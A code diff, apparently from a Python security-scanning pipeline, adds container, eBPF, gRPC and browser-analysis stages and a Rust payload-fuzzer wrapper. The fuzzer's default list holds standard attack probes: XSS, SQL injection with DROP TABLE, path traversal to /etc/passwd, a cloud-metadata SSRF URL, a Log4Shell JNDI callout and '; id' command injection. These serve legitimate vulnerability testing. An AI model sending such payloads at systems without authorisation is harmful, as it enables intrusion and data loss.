+                _fd = _f.to_dict() if hasattr(_f, "to_dict") else (vars(_f) if hasattr(_f, "__dict__") else {})
+                _fd.setdefault("source_type", "tool")
+                findings.append(_fd)
+            if _raw_findings:
+                log.info("container_scan: %d findings for %s", len(_raw_findings), target)
+        except ImportError:
+            log.debug("container_scan: ContainerEscapeScanner not available")
+        except Exception as exc:
+            log.warning("container_scan ContainerEscapeScanner failed (non-fatal): %s", exc)
+
+        # ── eBPF syscall tracer — observe suspicious kernel activity ───────
+        # Linux + root only; completely non-fatal on all other systems.
+        try:
+            ebpf_findings = self._run_ebpf_syscall_tracer(
+                target=probe_url, scan_id=scan_id, duration=5.0,
+            )
+            for _ef in ebpf_findings:
+                _ef.setdefault("source_type", "ebpf")
+                _ef.setdefault("tool", "syscall_tracer")
+                findings.append(_ef)
+            if ebpf_findings:
+                log.info("container_scan ebpf_tracer: %d syscall events for %s", len(ebpf_findings), target)
+        except Exception as _ebpf_exc:
+            log.debug("container_scan ebpf_tracer failed (non-fatal): %s", _ebpf_exc)
+
+        (out / "container_findings.json").write_text(
+            json.dumps({"findings": findings, "count": len(findings)}, indent=2, default=str)
+        )
+        return findings
+
+    def _inline_grpc_scan(self, target: str, out: Path) -> List[dict]:
+        """
+        gRPC/Protobuf attack surface scan: reflection abuse, proto fuzzing, auth bypass,
+        streaming RPC DoS, gRPC-Web detection, plaintext gRPC, unknown field injection.
+        Synchronous — no asyncio bridge needed.
+        """
+        findings: List[dict] = []
+        try:
+            from oneinfinity.scan.grpc_scanner import GRPCScanner
+            probe_url = target if target.startswith("http") else f"https://{target}"
+            _scanner = GRPCScanner(target=probe_url, timeout=8)
+            _raw_findings = _scanner.run()
+            for _f in (_raw_findings or []):
+                _fd = _f.to_dict() if hasattr(_f, "to_dict") else (vars(_f) if hasattr(_f, "__dict__") else {})
+                _fd.setdefault("source_type", "tool")
+                findings.append(_fd)
+            if _raw_findings:
+                log.info("grpc_scan: %d findings for %s", len(_raw_findings), target)
+            (out / "grpc_findings.json").write_text(
+                json.dumps({"findings": findings, "count": len(findings)}, indent=2, default=str)
+            )
+        except ImportError:
+            log.debug("grpc_scan: GRPCScanner not available")
+        except Exception as exc:
+            log.warning("grpc_scan inline failed (non-mandatory): %s", exc)
         return findings
 
     def _inline_browser_analysis(self, target: str, out: Path) -> List[dict]:
@@ -1315,6 +2792,26 @@ class CanonicalExecutor:
                 findings.append(f)
         except Exception as exc:
             log.debug("browser_analysis websocket: %s", exc)
+
+        # ── P1.6: Browser Reasoning Agent (LLM-based SPA analysis) ───────────
+        # Triple-layered fallback: Playwright → BeautifulSoup → empty list
+        # Returns list[dict] directly via to_dict() — already pipeline-compatible
+        try:
+            import asyncio as _asyncio_bra
+            from oneinfinity.scan.browser_reasoning_agent import BrowserReasoningAgent
+            _bra = BrowserReasoningAgent(target=probe_url, timeout=25)
+            _bra_findings = _asyncio_bra.run(_bra.scan())
+            for _bf in (_bra_findings or []):
+                _fd = _bf if isinstance(_bf, dict) else (_bf.to_dict() if hasattr(_bf, "to_dict") else vars(_bf))
+                _fd.setdefault("source_type", "tool")
+                _fd.setdefault("confidence", 0.80)
+                findings.append(_fd)
+            if _bra_findings:
+                log.info("browser_analysis BrowserReasoningAgent: %d findings for %s", len(_bra_findings), target)
+        except ImportError:
+            log.debug("browser_analysis BrowserReasoningAgent not available (Playwright/BS4 absent)")
+        except Exception as _bra_exc:
+            log.debug("browser_analysis BrowserReasoningAgent failed (non-fatal): %s", _bra_exc)
 
         (out / "browser_findings.json").write_text(
             json.dumps({
@@ -1508,6 +3005,124 @@ class CanonicalExecutor:
             except Exception:
                 pass
 
+    # ── Rust payload fuzzer helpers ────────────────────────────────────────────
+
+    @staticmethod
+    def _rust_payload_fuzzer_path() -> Optional[str]:
+        """Locate the Rust payload-fuzzer binary."""
+        here = Path(__file__).parent
+        repo_root = here.parent.parent.parent
+        local = repo_root / "src" / "rust" / "payload_fuzzer" / "target" / "release" / "payload-fuzzer"
+        if local.is_file() and os.access(str(local), os.X_OK):
+            return str(local)
+        found = shutil.which("payload-fuzzer")
+        if found:
+            return found
+        local_bin = Path.home() / ".local" / "bin" / "payload-fuzzer"
+        if local_bin.is_file() and os.access(str(local_bin), os.X_OK):
+            return str(local_bin)
+        return None
+
+    @staticmethod
+    def _default_fuzz_payloads() -> List[str]:
+        return [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "' OR '1'='1",
+            "1; DROP TABLE users--",
+            "{{7*7}}",
+            "${7*7}",
+            "../../../../etc/passwd",
+            "http://169.254.169.254/latest/meta-data/",
+            "${jndi:ldap://oast.me/x}",
+            "; id",
+        ]
+
+    @staticmethod
+    def _run_rust_payload_fuzzer(
+        binary: str,
+        target: str,
+        payloads: List[str],
+        waf: dict,
+    ) -> List[dict]:
+        """
+        Invoke the Rust payload-fuzzer binary, pipe payloads via stdin, collect findings.
+        Returns a list of finding dicts (confidence >= 0.6).
+        """
+        import json as _json
+
+        scan_id = uuid.uuid4().hex[:16]
+        workers = 10 if waf.get("waf_detected") else 30
+
+        # Build target URL with FUZZ marker — use a common query parameter injection point
+        fuzz_target = target.rstrip("/") + "/?q=FUZZ"
+
+        cmd = [
+            binary,
+            "--target", fuzz_target,
+            "--method", "GET",
+            "--workers", str(workers),
+            "--timeout", "8",
+            "--scan-id", scan_id,
+            "--min-confidence", "0.6",
+        ]
+
+        payload_input = _json.dumps(payloads)
+        try:
+            proc = subprocess.run(
+                cmd,
+                input=payload_input,
+                capture_output=True,
+                text=True,
+                timeout=120,
+            )
+        except subprocess.TimeoutExpired:
+            log.warning("_run_rust_payload_fuzzer: timed out")
+            return []
+        except OSError as exc:
+            log.debug("_run_rust_payload_fuzzer: subprocess error: %s", exc)
+            return []
+
+        findings: List[dict] = []
+        for line in proc.stdout.splitlines():
+            line = line.strip()
+            if not line:
+                continue
+            try:
+                obj = _json.loads(line)
+            except _json.JSONDecodeError:
+                continue
+            # Skip stats line
+            if obj.get("type") == "stats":
+                continue
+            # Normalize to OI finding format
+            obj.setdefault("source_type", "tool")
+            obj.setdefault("tool", "rust:payload-fuzzer")
+            obj.setdefault("severity", "medium")
+            obj.setdefault("title", f"Payload injection: {obj.get('vuln_type', 'injection')}")
+            findings.append(obj)
+        return findings
+
+    # ── eBPF syscall tracer helper ──────────────────────────────────────────────
+
+    @staticmethod
+    def _run_ebpf_syscall_tracer(target: str, scan_id: str, duration: float = 5.0) -> List[dict]:
+        """
+        Call the eBPF syscall tracer to observe suspicious kernel activity
+        during the container scan phase. Linux + root only; silently skips otherwise.
+        """
+        try:
+            # Import the loader from src/ebpf/
+            here = Path(__file__).parent
+            ebpf_dir = here.parent.parent.parent / "src" / "ebpf"
+            if str(ebpf_dir) not in sys.path:
+                sys.path.insert(0, str(ebpf_dir))
+            from syscall_tracer_loader import trace_scan_target  # type: ignore
+            return trace_scan_target(target_url=target, scan_id=scan_id, duration=duration)
+        except Exception as exc:
+            log.debug("_run_ebpf_syscall_tracer: %s", exc)
+            return []
+
 
 # ---------------------------------------------------------------------------
 # Convenience factory
@@ -1522,6 +3137,7 @@ def run_canonical_pipeline(
     skip_phases: Optional[List[str]] = None,
     prior_results_dir: Optional[str] = None,
     auth_config: Optional[Dict[str, str]] = None,
+    timeout_multiplier: float = 1.0,
 ) -> PipelineResult:
     """One-call entry point used by both CLI and Docker worker."""
     executor = CanonicalExecutor(
@@ -1531,5 +3147,6 @@ def run_canonical_pipeline(
         skip_phases=skip_phases,
         prior_results_dir=prior_results_dir,
         auth_config=auth_config,
+        timeout_multiplier=timeout_multiplier,
     )
     return executor.run(target, output_dir)
